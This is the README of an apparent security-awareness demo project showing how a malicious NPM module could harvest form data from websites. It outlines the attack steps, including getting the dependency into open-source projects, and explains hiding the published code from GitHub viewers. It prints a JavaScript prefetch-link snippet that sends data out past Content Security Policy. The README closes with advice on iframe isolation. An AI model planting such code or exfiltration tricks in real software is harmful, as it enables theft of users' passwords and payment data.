If you're like me, you have grown to love how productive you can be using NPM. There is a staggering
number of common problems that have already been solved. As developers, we tend to have a great deal of trust towards NPM and the code that it hosts. How often do we carefully examine the code we are about to important into our projects?

The following project aims to show the dangers of blindly importing NPM modules. It shows how just because you can see the code on Github does not mean the module you are importing is safe. It also demonstrates how all it takes is one disgruntled employee to start harvesting user's data, silently, and indefinitely. It shows just how hard it is to sniff out such an attack. Finally, it aims to show how our as our javascript project's dependencies grow, our risk of being affected by such an attack increases dramatically.

##### Credit

This entire project is based off [this Medium Post](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5). Credit to it's author, David Gilbertson for all the ideas and even some of the code.

##### What all is here?

1. A basic React app with some form inputs
2. A npm module, 'bad_juju', that will house our malicious code
3. An api to receive the form data

##### Running the React Application

```javascript
# within demo dir
> yarn start
```

##### Running the API

```javascript
# within demo dir
> node ./api
```

##### How does the attack work?

1. User creates seemingly useful node_module
2. When imported, our node_module applies exploit to all forms on the site/application
3. Send all form data to an API - this should a) not be visible to humans and b) appear as though its just an analytics link
4. Be clever about how/when we send the form data and use all the information available to judge how safe it is to send
5. Make Pull Requests to Open Source projects and attempt to add our dependency to the project
6. Sit back and watch the data pour in

##### What shows in Github is not necessarily what is in NPM
using .gitignore, .npmignore, and the files configuration option in our package.json, we can have different code in NPM than what shows in Github. So you really have no clue what code you are running from NPM, even if you have complete access to the github source. The only way to check this would be to check the 3 config files from the first sentence of this section. I bet you don't do that every time you install an NPM module, do you?


##### Content Security Policy
This is supposed to be our saving grace, right? Wrong. In Chrome, we can bypass the content security policy using the following code
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```

##### Why is NPM the distribution method?
When we add a dependency to our project, NPM will automatically pull in all of this new dependency's dependencies. This means that if one popular package gets infected, it will likely spread to hundreds or thousands of smaller packages. An infected top level package would be bad news for everyone. Remember left_pad?

##### So what... I can never use NPM modules?
Well that certainly is one option... If you truly want to ensure that you will never fall victim to this attack, you must isolate any pages with sensitive form data outside of the scope of the NPM modules. Example, for a login or checkout screen, you may want to embed an isolated page within an iFrame. This way no offending code will be able to attack the content with the iFrame.